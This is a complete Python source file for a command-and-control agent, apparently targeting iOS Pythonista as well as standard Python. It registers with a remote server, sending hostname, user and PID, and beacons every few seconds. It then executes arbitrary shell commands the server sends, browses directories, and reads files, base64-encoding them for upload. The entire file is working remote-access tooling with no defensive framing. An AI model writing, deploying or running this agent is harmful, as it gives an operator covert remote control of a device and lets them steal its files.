"""
C2 Agent — HTTP polling version
Compatible with Pythonista 3 (iOS) and standard Python 3.x
"""
import json
import time
import platform
import os
import threading
import base64

try:
    import urllib.request as urlreq
    import urllib.error   as urlerr
except ImportError:
    import urllib2 as urlreq  # Python 2 fallback (unlikely on Pythonista 3)

# ── CONFIG ────────────────────────────────────────────────────────────────────
C2_URL          = "https://YOUR-APP.onrender.com"   # ← change this after deploy
BEACON_INTERVAL = 3   # seconds between beacons
TIMEOUT         = 10  # HTTP request timeout
# ─────────────────────────────────────────────────────────────────────────────

agent_id  = None
cwd       = os.path.expanduser("~")


# ── HTTP HELPERS ──────────────────────────────────────────────────────────────
def post(path, data=None):
    """POST JSON to server, return parsed JSON response or None on error."""
    if data is None:
        data = {}
    url     = C2_URL.rstrip("/") + path
    payload = json.dumps(data).encode("utf-8")
    req     = urlreq.Request(
        url,
        data    = payload,
        headers = {"Content-Type": "application/json"}
    )
    try:
        with urlreq.urlopen(req, timeout=TIMEOUT) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except Exception:
        return None


# ── COMMAND HANDLERS ──────────────────────────────────────────────────────────
def run_shell(cmd):
    """Run a shell command, return (stdout+stderr, error_or_None)."""
    try:
        import subprocess
        proc = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, cwd=cwd
        )
        out, err = proc.communicate(timeout=15)
        combined = (out + err).decode("utf-8", errors="replace")
        return combined, None
    except Exception:
        # Pythonista sometimes blocks subprocess — fall back to os.popen
        try:
            result = os.popen(cmd).read()
            return result, None
        except Exception as e:
            return "", str(e)


def handle(cmd):
    global cwd
    t    = cmd.get("type", "shell")
    args = cmd.get("args", {})
    cid  = cmd.get("cmd_id", "")

    if t == "ping":
        return {"type": t, "cmd_id": cid, "result": "pong"}

    elif t == "shell":
        raw_cmd = args.get("cmd", "")
        output, err = run_shell(raw_cmd)
        if err:
            return {"type": t, "cmd_id": cid, "error": err}
        return {"type": t, "cmd_id": cid, "result": output}

    elif t == "ls":
        path = args.get("path", ".") or "."
        if not os.path.isabs(path):
            path = os.path.join(cwd, path)
        try:
            entries = os.listdir(path)
            lines   = []
            for name in sorted(entries):
                full = os.path.join(path, name)
                tag  = "/" if os.path.isdir(full) else ""
                lines.append(name + tag)
            return {"type": t, "cmd_id": cid, "result": "\n".join(lines)}
        except Exception as e:
            return {"type": t, "cmd_id": cid, "error": str(e)}

    elif t == "cd":
        path = args.get("path", "~")
        if path == "~":
            path = os.path.expanduser("~")
        elif not os.path.isabs(path):
            path = os.path.join(cwd, path)
        path = os.path.normpath(path)
        if os.path.isdir(path):
            cwd = path
            return {"type": t, "cmd_id": cid, "result": cwd}
        return {"type": t, "cmd_id": cid, "error": "not a directory: " + path}

    elif t == "read_file":
        path = args.get("path", "")
        if not os.path.isabs(path):
            path = os.path.join(cwd, path)
        try:
            with open(path, "rb") as f:
                content = base64.b64encode(f.read()).decode()
            return {"type": t, "cmd_id": cid, "b64": content}
        except Exception as e:
            return {"type": t, "cmd_id": cid, "error": str(e)}

    else:
        return {"type": t, "cmd_id": cid, "error": "unknown command type: " + t}


# ── SYSTEM INFO ───────────────────────────────────────────────────────────────
def sysinfo():
    info = {
        "platform": platform.system(),
        "version":  platform.version(),
        "node":     platform.node(),
        "cwd":      cwd,
        "pid":      os.getpid(),
    }
    try:
        import getpass
        info["user"] = getpass.getuser()
    except Exception:
        info["user"] = "unknown"
    return info


# ── MAIN LOOP ─────────────────────────────────────────────────────────────────
def run():
    global agent_id, cwd

    print("[*] C2 agent starting — target:", C2_URL)

    while True:
        # ── 1. Register ───────────────────────────────────────────────────────
        agent_id = None
        while agent_id is None:
            resp = post("/agent/hello", sysinfo())
            if resp and resp.get("id"):
                agent_id = resp["id"]
                print("[+] registered as", agent_id)
            else:
                print("[-] hello failed, retrying in 5s…")
                time.sleep(5)

        # ── 2. Beacon loop ────────────────────────────────────────────────────
        while True:
            try:
                resp = post("/agent/beacon/" + agent_id)
                if resp is None:
                    print("[-] beacon failed — reconnecting")
                    break

                if resp.get("type") != "noop":
                    result = handle(resp)
                    post("/agent/result/" + agent_id, result)

                time.sleep(BEACON_INTERVAL)

            except KeyboardInterrupt:
                print("[!] interrupted")
                return
            except Exception as e:
                print("[-] error:", e)
                time.sleep(5)
                break


# ── ENTRY POINT ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    run()
